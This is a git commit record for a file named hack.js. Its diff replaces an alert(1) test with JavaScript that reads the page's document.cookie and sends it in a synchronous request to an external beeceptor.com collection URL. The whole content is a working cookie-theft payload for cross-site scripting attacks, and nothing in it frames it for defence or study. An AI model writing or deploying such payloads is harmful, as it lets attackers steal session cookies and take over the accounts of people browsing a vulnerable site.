c4db1e248f6e1ecd8e4edc46ed9b58115da0ad93
Evenson Jeunesse <47871332+EvensonJeunesse@users.noreply.github.com>
2022-04-29 23:49:04 +0100

    Update hack.js

--- hack.js
+++ hack.js
@@ -1,1 +1,3 @@
-alert(1)
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "https://testfdfd.free.beeceptor.com/?"+document.cookie, false ); // false for synchronous request
+xmlHttp.send( null );
